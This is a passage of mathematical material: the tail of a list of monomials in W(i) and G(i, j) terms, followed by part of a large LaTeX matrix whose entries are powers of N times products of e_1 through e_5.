W(1)W(4)W(5)W(6)G(2, 7)G(3, 8)\n    W(2)W(3)W(4)W(5)G(1, 6)G(7, 8)\n    W(2)W(3)W(4)W(5)G(1, 7)G(6, 8)\n    W(2)W(3)W(4)W(6)G(1, 7)G(5, 8)\n    W(2)W(3)W(5)W(6)G(1, 7)G(4, 8)\n    W(2)W(4)W(5)W(6)G(1, 7)G(3, 8)\n    W(3)W(4)W(5)W(6)G(1, 7)G(2, 8)\n    W(1)W(2)W(3)W(4)W(5)W(6)G(7, 8)\n    W(1)W(2)W(3)W(4)W(5)W(7)G(6, 8)\n    W(1)W(2)W(3)W(4)W(6)W(7)G(5, 8)\n    W(1)W(2)W(3)W(5)W(6)W(7)G(4, 8)\n    W(1)W(2)W(4)W(5)W(6)W(7)G(3, 8)\n    W(1)W(3)W(4)W(5)W(6)W(7)G(2, 8)\n    W(2)W(3)W(4)W(5)W(6)W(7)G(1, 8)\n    W(1)W(2)W(3)W(4)W(5)W(6)W(7)W(8)\n    ```\n\n    $$\n    \\left(\\begin{array}{rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr}\n    1 & -N & 0 & N^{2} & 0 & 0 & 0 & -N^{3} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{6} \\\\\n    0 & e_{1} & -e_{1} & -N e_{1} & -e_{1} & 0 & N e_{1} & N^{2} e_{1} & -e_{1} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{1} & -N^{3} e_{1} & -e_{1} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{1} & N^{4} e_{1} & -e_{1} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{4} e_{1} & -N^{5} e_{1} \\\\\n    0 & 0 & e_{2} & -N e_{2} & 0 & N e_{2} & 0 & N^{2} e_{2} & 0 & N e_{2} & 0 & 0 & 0 & -N^{2} e_{2} & 0 & -N^{3} e_{2} & 0 & N e_{2} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{2} & 0 & N^{4} e_{2} & 0 & N e_{2} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{4} e_{2} & 0 & -N^{5} e_{2} \\\\\n    0 & 0 & 0 & e_{1} e_{2} & 0 & -e_{1} e_{2} & -e_{1} e_{2} & -N e_{1} e_{2} & 0 & -e_{1} e_{2} & 0 & e_{1} e_{2} & 0 & N e_{1} e_{2} & N e_{1} e_{2} & N^{2} e_{1} e_{2} & 0 & -e_{1} e_{2} & 0 & e_{1} e_{2} & e_{1} e_{2} & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{2} & 0 & 0 & -N^{2} e_{1} e_{2} & -N^{2} e_{1} e_{2} & -N^{3} e_{1} e_{2} & 0 & -e_{1} e_{2} & 0 & e_{1} e_{2} & e_{1} e_{2} & e_{1} e_{2} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{1} e_{2} & 0 & 0 & 0 & N^{3} e_{1} e_{2} & N^{3} e_{1} e_{2} & N^{4} e_{1} e_{2} \\\\\n    0 & 0 & 0 & 0 & e_{3} & -N e_{3} & -N e_{3} & N^{2} e_{3} & 0 & 0 & 0 & 0 & -N^{2} e_{3} & 0 & 0 & -N^{3} e_{3} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{3} & 0 & 0 & N^{4} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{4} e_{3} & 0 & 0 & -N^{5} e_{3} \\\\\n    0 & 0 & 0 & 0 & 0 & e_{1} e_{3} & 0 & -N e_{1} e_{3} & 0 & 0 & e_{1} e_{3} & 0 & N e_{1} e_{3} & 0 & N e_{1} e_{3} & N^{2} e_{1} e_{3} & 0 & 0 & e_{1} e_{3} & 0 & 0 & N e_{1} e_{3} & 0 & 0 & 0 & -N e_{1} e_{3} & 0 & 0 & -N^{2} e_{1} e_{3} & 0 & -N^{2} e_{1} e_{3} & -N^{3} e_{1} e_{3} & 0 & 0 & e_{1} e_{3} & 0 & 0 & 0 & N e_{1} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{1} e_{3} & 0 & 0 & 0 & N^{3} e_{1} e_{3} & 0 & N^{3} e_{1} e_{3} & N^{4} e_{1} e_{3} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} & -N e_{2} e_{3} & 0 & 0 & -e_{2} e_{3} & -e_{2} e_{3} & N e_{2} e_{3} & N e_{2} e_{3} & 0 & N^{2} e_{2} e_{3} & 0 & 0 & -e_{2} e_{3} & -e_{2} e_{3} & 0 & N e_{2} e_{3} & 0 & -N e_{2} e_{3} & 0 & 0 & 0 & 0 & -N^{2} e_{2} e_{3} & -N^{2} e_{2} e_{3} & 0 & -N^{3} e_{2} e_{3} & 0 & 0 & -e_{2} e_{3} & -e_{2} e_{3} & 0 & 0 & N e_{2} e_{3} & 0 & -N e_{2} e_{3} & -N e_{2} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{2} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{2} e_{3} & N^{3} e_{2} e_{3} & 0 & N^{4} e_{2} e_{3} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} & -e_{1} e_{2} e_{3} & -e_{1} e_{2} e_{3} & -N e_{1} e_{2} e_{3} & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} & 0 & e_{1} e_{2} e_{3} & 0 & e_{1} e_{2} e_{3} & e_{1} e_{2} e_{3} & 0 & N e_{1} e_{2} e_{3} & N e_{1} e_{2} e_{3} & N e_{1} e_{2} e_{3} & N^{2} e_{1} e_{2} e_{3} & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} & 0 & e_{1} e_{2} e_{3} & e_{1} e_{2} e_{3} & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{2} e_{3} & 0 & 0 & -N e_{1} e_{2} e_{3} & -N e_{1} e_{2} e_{3} & 0 & 0 & -N^{2} e_{1} e_{2} e_{3} & -N^{2} e_{1} e_{2} e_{3} & -N^{2} e_{1} e_{2} e_{3} & -N^{3} e_{1} e_{2} e_{3} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{4} & -N e_{4} & 0 & 0 & N^{2} e_{4} & N^{2} e_{4} & N^{2} e_{4} & -N^{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{4} & 0 & 0 & 0 & N^{4} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{4} e_{4} & 0 & 0 & 0 & -N^{5} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{4} & -e_{1} e_{4} & -e_{1} e_{4} & -N e_{1} e_{4} & -N e_{1} e_{4} & 0 & N^{2} e_{1} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{4} & 0 & 0 & -N^{2} e_{1} e_{4} & 0 & 0 & -N^{2} e_{1} e_{4} & -N^{3} e_{1} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{4} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{1} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{1} e_{4} & 0 & 0 & 0 & N^{3} e_{1} e_{4} & 0 & 0 & N^{3} e_{1} e_{4} & N^{4} e_{1} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{4} & 0 & -N e_{2} e_{4} & 0 & -N e_{2} e_{4} & N^{2} e_{2} e_{4} & 0 & 0 & 0 & 0 & -e_{2} e_{4} & 0 & -N e_{2} e_{4} & 0 & 0 & 0 & N e_{2} e_{4} & -N^{2} e_{2} e_{4} & 0 & -N^{2} e_{2} e_{4} & 0 & -N^{3} e_{2} e_{4} & 0 & 0 & 0 & 0 & -e_{2} e_{4} & 0 & 0 & -N e_{2} e_{4} & 0 & 0 & N e_{2} e_{4} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{2} e_{4} & 0 & 0 & 0 & N^{2} e_{2} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{2} e_{4} & 0 & N^{3} e_{2} e_{4} & 0 & N^{4} e_{2} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{4} & 0 & -N e_{3} e_{4} & -N e_{3} e_{4} & N^{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & N e_{3} e_{4} & N e_{3} e_{4} & N e_{3} e_{4} & N e_{3} e_{4} & 0 & -N^{2} e_{3} e_{4} & -N^{2} e_{3} e_{4} & 0 & 0 & -N^{3} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N e_{3} e_{4} & N e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{3} e_{4} & 0 & N^{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{3} e_{3} e_{4} & N^{3} e_{3} e_{4} & 0 & 0 & N^{4} e_{3} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{4} & 0 & 0 & -N e_{1} e_{2} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{4} & 0 & e_{1} e_{2} e_{4} & 0 & 0 & N e_{1} e_{2} e_{4} & 0 & N e_{1} e_{2} e_{4} & N e_{1} e_{2} e_{4} & N^{2} e_{1} e_{2} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{4} & 0 & N e_{1} e_{2} e_{4} & 0 & 0 & 0 & -N e_{1} e_{2} e_{4} & 0 & 0 & -N e_{1} e_{2} e_{4} & 0 & -N e_{1} e_{2} e_{4} & 0 & -N^{2} e_{1} e_{2} e_{4} & 0 & -N^{2} e_{1} e_{2} e_{4} & -N^{2} e_{1} e_{2} e_{4} & -N^{3} e_{1} e_{2} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{4} & 0 & -N e_{1} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{3} e_{4} & -e_{1} e_{3} e_{4} & 0 & 0 & 0 & N e_{1} e_{3} e_{4} & N e_{1} e_{3} e_{4} & 0 & N e_{1} e_{3} e_{4} & N^{2} e_{1} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{3} e_{4} & -e_{1} e_{3} e_{4} & 0 & e_{1} e_{3} e_{4} & 0 & -e_{1} e_{3} e_{4} & 0 & 0 & 0 & N e_{1} e_{3} e_{4} & 0 & -N e_{1} e_{3} e_{4} & 0 & 0 & 0 & 0 & -N e_{1} e_{3} e_{4} & -N e_{1} e_{3} e_{4} & 0 & 0 & -N^{2} e_{1} e_{3} e_{4} & -N^{2} e_{1} e_{3} e_{4} & 0 & -N^{2} e_{1} e_{3} e_{4} & -N^{3} e_{1} e_{3} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{4} & -N e_{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{2} e_{3} e_{4} & -e_{2} e_{3} e_{4} & -e_{2} e_{3} e_{4} & N e_{2} e_{3} e_{4} & N e_{2} e_{3} e_{4} & N e_{2} e_{3} e_{4} & 0 & N^{2} e_{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{2} e_{3} e_{4} & 0 & e_{2} e_{3} e_{4} & 0 & e_{2} e_{3} e_{4} & e_{2} e_{3} e_{4} & N e_{2} e_{3} e_{4} & 0 & -N e_{2} e_{3} e_{4} & 0 & -N e_{2} e_{3} e_{4} & -N e_{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{2} e_{3} e_{4} & -N^{2} e_{2} e_{3} e_{4} & -N^{2} e_{2} e_{3} e_{4} & 0 & -N^{3} e_{2} e_{3} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} e_{4} & -e_{1} e_{2} e_{3} e_{4} & -e_{1} e_{2} e_{3} e_{4} & -e_{1} e_{2} e_{3} e_{4} & -N e_{1} e_{2} e_{3} e_{4} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} e_{4} & 0 & e_{1} e_{2} e_{3} e_{4} & 0 & e_{1} e_{2} e_{3} e_{4} & e_{1} e_{2} e_{3} e_{4} & 0 & e_{1} e_{2} e_{3} e_{4} & e_{1} e_{2} e_{3} e_{4} & e_{1} e_{2} e_{3} e_{4} & 0 & N e_{1} e_{2} e_{3} e_{4} & N e_{1} e_{2} e_{3} e_{4} & N e_{1} e_{2} e_{3} e_{4} & N e_{1} e_{2} e_{3} e_{4} & N^{2} e_{1} e_{2} e_{3} e_{4} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{5} & -N e_{5} & 0 & 0 & 0 & N^{2} e_{5} & 0 & 0 & 0 & 0 & 0 & -N^{3} e_{5} & -N^{3} e_{5} & -N^{3} e_{5} & -N^{3} e_{5} & N^{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{4} e_{5} & 0 & 0 & 0 & 0 & -N^{5} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{5} & -e_{1} e_{5} & -e_{1} e_{5} & -e_{1} e_{5} & -N e_{1} e_{5} & 0 & 0 & N e_{1} e_{5} & N e_{1} e_{5} & N e_{1} e_{5} & N^{2} e_{1} e_{5} & N^{2} e_{1} e_{5} & N^{2} e_{1} e_{5} & 0 & -N^{3} e_{1} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{1} e_{5} & 0 & 0 & 0 & N^{3} e_{1} e_{5} & 0 & 0 & 0 & N^{3} e_{1} e_{5} & N^{4} e_{1} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{5} & 0 & 0 & -N e_{2} e_{5} & N e_{2} e_{5} & N e_{2} e_{5} & 0 & 0 & 0 & N^{2} e_{2} e_{5} & N^{2} e_{2} e_{5} & 0 & N^{2} e_{2} e_{5} & -N^{3} e_{2} e_{5} & 0 & 0 & 0 & 0 & 0 & -e_{2} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{2} e_{5} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{2} e_{5} & N^{3} e_{2} e_{5} & 0 & 0 & N^{3} e_{2} e_{5} & 0 & N^{4} e_{2} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{5} & 0 & 0 & -N e_{3} e_{5} & 0 & -N e_{3} e_{5} & 0 & 0 & N^{2} e_{3} e_{5} & 0 & N^{2} e_{3} e_{5} & N^{2} e_{3} e_{5} & -N^{3} e_{3} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N e_{3} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{3} e_{5} & 0 & 0 & 0 & -N^{2} e_{3} e_{5} & 0 & 0 & -N^{2} e_{3} e_{5} & 0 & N^{3} e_{3} e_{5} & 0 & N^{3} e_{3} e_{5} & 0 & 0 & N^{4} e_{3} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{4} e_{5} & 0 & 0 & -N e_{4} e_{5} & 0 & -N e_{4} e_{5} & -N e_{4} e_{5} & 0 & N^{2} e_{4} e_{5} & N^{2} e_{4} e_{5} & N^{2} e_{4} e_{5} & -N^{3} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{4} e_{5} & -N^{2} e_{4} e_{5} & -N^{2} e_{4} e_{5} & -N^{2} e_{4} e_{5} & 0 & -N^{2} e_{4} e_{5} & -N^{2} e_{4} e_{5} & 0 & 0 & N^{3} e_{4} e_{5} & N^{3} e_{4} e_{5} & 0 & 0 & 0 & N^{4} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{5} & -e_{1} e_{2} e_{5} & -e_{1} e_{2} e_{5} & -e_{1} e_{2} e_{5} & -e_{1} e_{2} e_{5} & 0 & -N e_{1} e_{2} e_{5} & -N e_{1} e_{2} e_{5} & 0 & 0 & N^{2} e_{1} e_{2} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{5} & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{2} e_{5} & 0 & 0 & -N e_{1} e_{2} e_{5} & 0 & 0 & 0 & -N^{2} e_{1} e_{2} e_{5} & 0 & 0 & -N^{2} e_{1} e_{2} e_{5} & -N^{2} e_{1} e_{2} e_{5} & -N^{3} e_{1} e_{2} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{5} & 0 & 0 & 0 & -e_{1} e_{3} e_{5} & -N e_{1} e_{3} e_{5} & 0 & -N e_{1} e_{3} e_{5} & 0 & N^{2} e_{1} e_{3} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{3} e_{5} & 0 & -e_{1} e_{3} e_{5} & 0 & 0 & 0 & e_{1} e_{3} e_{5} & 0 & -N e_{1} e_{3} e_{5} & 0 & 0 & 0 & N e_{1} e_{3} e_{5} & -N e_{1} e_{3} e_{5} & 0 & 0 & 0 & -N^{2} e_{1} e_{3} e_{5} & 0 & -N^{2} e_{1} e_{3} e_{5} & 0 & -N^{2} e_{1} e_{3} e_{5} & -N^{3} e_{1} e_{3} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{4} e_{5} & 0 & 0 & 0 & 0 & -N e_{1} e_{4} e_{5} & -N e_{1} e_{4} e_{5} & 0 & N^{2} e_{1} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{4} e_{5} & e_{1} e_{4} e_{5} & e_{1} e_{4} e_{5} & e_{1} e_{4} e_{5} & 0 & 0 & N e_{1} e_{4} e_{5} & N e_{1} e_{4} e_{5} & N e_{1} e_{4} e_{5} & N e_{1} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{1} e_{4} e_{5} & -N^{2} e_{1} e_{4} e_{5} & 0 & 0 & -N^{2} e_{1} e_{4} e_{5} & -N^{3} e_{1} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{5} & 0 & 0 & -N e_{2} e_{3} e_{5} & 0 & 0 & -N e_{2} e_{3} e_{5} & N^{2} e_{2} e_{3} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{5} & 0 & e_{2} e_{3} e_{5} & 0 & 0 & 0 & -N e_{2} e_{3} e_{5} & 0 & -N e_{2} e_{3} e_{5} & 0 & 0 & 0 & 0 & N e_{2} e_{3} e_{5} & N e_{2} e_{3} e_{5} & -N^{2} e_{2} e_{3} e_{5} & 0 & -N^{2} e_{2} e_{3} e_{5} & -N^{2} e_{2} e_{3} e_{5} & 0 & -N^{3} e_{2} e_{3} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{4} e_{5} & 0 & 0 & -N e_{2} e_{4} e_{5} & 0 & -N e_{2} e_{4} e_{5} & N^{2} e_{2} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{2} e_{4} e_{5} & -e_{2} e_{4} e_{5} & 0 & 0 & 0 & 0 & N e_{2} e_{4} e_{5} & N e_{2} e_{4} e_{5} & 0 & 0 & 0 & N e_{2} e_{4} e_{5} & N e_{2} e_{4} e_{5} & 0 & N e_{2} e_{4} e_{5} & -N^{2} e_{2} e_{4} e_{5} & -N^{2} e_{2} e_{4} e_{5} & 0 & -N^{2} e_{2} e_{4} e_{5} & 0 & -N^{3} e_{2} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{4} e_{5} & 0 & 0 & -N e_{3} e_{4} e_{5} & -N e_{3} e_{4} e_{5} & N^{2} e_{3} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{3} e_{4} e_{5} & -e_{3} e_{4} e_{5} & -e_{3} e_{4} e_{5} & 0 & 0 & 0 & N e_{3} e_{4} e_{5} & N e_{3} e_{4} e_{5} & N e_{3} e_{4} e_{5} & N e_{3} e_{4} e_{5} & N e_{3} e_{4} e_{5} & N e_{3} e_{4} e_{5} & 0 & -N^{2} e_{3} e_{4} e_{5} & -N^{2} e_{3} e_{4} e_{5} & -N^{2} e_{3} e_{4} e_{5} & 0 & 0 & -N^{3} e_{3} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{5} & 0 & 0 & 0 & -N e_{1} e_{2} e_{3} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{5} & 0 & e_{1} e_{2} e_{3} e_{5} & 0 & 0 & e_{1} e_{2} e_{3} e_{5} & 0 & 0 & 0 & N e_{1} e_{2} e_{3} e_{5} & 0 & N e_{1} e_{2} e_{3} e_{5} & N e_{1} e_{2} e_{3} e_{5} & N e_{1} e_{2} e_{3} e_{5} & N^{2} e_{1} e_{2} e_{3} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{4} e_{5} & 0 & 0 & -N e_{1} e_{2} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{4} e_{5} & -e_{1} e_{2} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N e_{1} e_{2} e_{4} e_{5} & N e_{1} e_{2} e_{4} e_{5} & 0 & N e_{1} e_{2} e_{4} e_{5} & N e_{1} e_{2} e_{4} e_{5} & N^{2} e_{1} e_{2} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{4} e_{5} & 0 & -N e_{1} e_{3} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{3} e_{4} e_{5} & -e_{1} e_{3} e_{4} e_{5} & -e_{1} e_{3} e_{4} e_{5} & 0 & 0 & 0 & 0 & N e_{1} e_{3} e_{4} e_{5} & N e_{1} e_{3} e_{4} e_{5} & N e_{1} e_{3} e_{4} e_{5} & 0 & N e_{1} e_{3} e_{4} e_{5} & N^{2} e_{1} e_{3} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{4} e_{5} & -N e_{2} e_{3} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{2} e_{3} e_{4} e_{5} & -e_{2} e_{3} e_{4} e_{5} & -e_{2} e_{3} e_{4} e_{5} & -e_{2} e_{3} e_{4} e_{5} & N e_{2} e_{3} e_{4} e_{5} & N e_{2} e_{3} e_{4} e_{5} & N e_{2} e_{3} e_{4} e_{5} & N e_{2} e_{3} e_{4} e_{5} & 0 & N^{2} e_{2} e_{3} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{4} e_{5} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{2} e_{3} e_{4} e_{5} & -e_{1} e_{2} e_{3} e_{4} e_{5} & -e_{1} e_{2} e_{3} e_{4} e_{5} & -e_{1} e_{2} e_{3} e_{4} e_{5} & -e_{1} e_{2} e_{3} e_{4} e_{5} & -N e_{1} e_{2} e_{3} e_{4} e_{5} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 